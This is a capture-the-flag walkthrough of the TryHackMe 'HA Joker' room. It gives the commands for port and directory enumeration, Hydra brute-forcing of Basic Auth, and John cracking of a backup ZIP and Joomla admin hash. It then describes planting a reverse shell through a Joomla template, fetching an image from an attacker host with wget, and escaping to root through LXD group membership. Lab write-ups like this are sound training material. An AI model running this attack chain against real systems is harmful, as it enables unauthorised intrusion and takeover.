# TryHackMe - HA Joker CTF

> *These notes were written with AI assistance for English clarity. Attack paths and commands reflect my own work on the room.*

**Difficulty:** Medium  
**Category:** Web, Joomla, LXD Privilege Escalation  
**Room:** [HA Joker CTF](https://tryhackme.com/room/jokerctf)  
**Description:** Batman hits Joker.

## Introduction

*"Batman hits Joker."* A guided walkthrough room themed around the Dark Knight — not a classic `user.txt` / `root.txt` boot-to-root, but a 19-question path through enumeration, credential cracking, Joomla exploitation, and container-based privilege escalation.

**Objectives:**
- Enumerate Apache services on two HTTP ports
- Gain a shell as `www-data` via Joomla
- Escalate to root through **LXD** group membership
- Complete all guided questions on TryHackMe

---

## Reconnaissance

Deploy the machine, note the IP, and run a full port scan:

```bash
sudo nmap -p- -sV -sC -T4 <TARGET_IP>
```

| Port | Service | Notes |
|------|---------|-------|
| 22 | SSH | OpenSSH 7.6p1 |
| 80 | HTTP | Apache 2.4.29 — no authentication |
| 8080 | HTTP | Apache 2.4.29 — Basic Auth required |

---

## Port 80 — Unauthenticated Web

Browse `http://<TARGET_IP>/` — a Joker-themed landing page.

Directory enumeration:

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt -x txt,php,html
```

| Path | Description |
|------|-------------|
| `/secret.txt` | Dialogue between Batman and Joker — hints at username `joker` |
| `/phpinfo.php` | PHP configuration leak |

**secret.txt excerpt:**

```
Batman hits Joker.
Joker: "Bats you may be a rock but you won't break me." (Laughs!)
Batman: "I will break you with this rock. You made a mistake now."
Joker: "This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock."
Joker: "HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!"
```

---

## Port 8080 — Basic Auth & Joomla CMS

Port 8080 requires HTTP Basic Authentication. The theme points to username `joker`:

```bash
hydra -l joker -P /usr/share/wordlists/rockyou.txt <TARGET_IP> -s 8080 http-get
```

After login, the site is a **Joomla** CMS blog.

Authenticated Nikto scan:

```bash
nikto -host http://<TARGET_IP>:8080/ -id joker:<PASSWORD>
```

Key findings:
- `/administrator/` — Joomla admin panel
- `/backup.zip` — password-protected backup archive
- `/robots.txt` — lists sensitive directories

---

## Backup Extraction & Database Dump

Download `backup.zip`, extract the hash, and crack with John:

```bash
zip2john backup.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
unzip backup.zip
```

The ZIP password matches the Basic Auth password — worth noting for later questions.

Inside: `db/joomladb.sql` — full Joomla database dump.

Search the SQL dump for the superuser entry and crack the bcrypt hash:

```bash
john hash_joomla --wordlist=/usr/share/wordlists/rockyou.txt
```

Use the recovered credentials to log into `http://<TARGET_IP>:8080/administrator/`.

---

## Initial Access — Reverse Shell

1. Navigate to **Extensions → Templates → Site Templates**
2. Select an active template (`protostar` or `beez3`)
3. Create or edit a PHP file with a reverse shell payload
4. Start a listener:

```bash
nc -lvnp 4444
```

5. Trigger the shell via the template URL:

```
http://<TARGET_IP>:8080/templates/protostar/shell.php
```

Stabilize the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# CTRL+Z → stty raw -echo; fg
export TERM=xterm
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
```

The `www-data` user belongs to the **lxd** group — the privilege escalation vector.

---

## Privilege Escalation — LXD

[LXD](https://linuxcontainers.org/lxd/) lets group members create privileged containers and mount the host filesystem.

### Build Alpine image (attack machine)

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
```

### Transfer image to target

On attack machine:

```bash
python3 -m http.server 8000
```

On target (`/tmp`):

```bash
wget http://<ATTACKER_IP>:8000/alpine-v3.13-x86_64-*.tar.gz
```

### Exploit LXD

```bash
lxc image import ./alpine-v3.13-x86_64-*.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

Inside the container:

```bash
cd /mnt/root/root
cat final.txt
```

`final.txt` contains ASCII art spelling **JOKER** and a completion message — not a `THM{...}` flag.

---

## Completing the Room

Work through each guided question on TryHackMe. Answers come from:

- Nmap / Nikto / Gobuster output
- Cracked credentials (Hydra, zip2john, John)
- Shell session enumeration (`id`, `/root` after LXD privesc)

*Direct question answers intentionally omitted.*

---

## Flags

| Objective | How to obtain |
|-----------|---------------|
| Guided questions (Q2–Q19) | Derived from enumeration and exploitation steps above |
| Final file in `/root` | Read `final.txt` after LXD privesc |

*No `THM{...}` flags in this room. Submit answers on [TryHackMe](https://tryhackme.com/room/jokerctf).*

---

## Conclusion

### What I learned

| Concept | Lesson |
|---------|--------|
| Dual HTTP ports | Port 80 open, port 8080 behind Basic Auth — enumerate both |
| Theme hints | `secret.txt` dialogue reveals the brute-force username |
| Joomla backup | `backup.zip` often contains a full SQL dump with admin hashes |
| Template RCE | Editing an active Joomla template is a reliable shell vector |
| LXD privesc | `lxd` group membership → privileged container → host `/` mounted |

---

## References

- [LXD Privilege Escalation — Hacking Articles](https://www.hackingarticles.in/lxd-privilege-escalation/)
- [lxd-alpine-builder — saghul](https://github.com/saghul/lxd-alpine-builder)
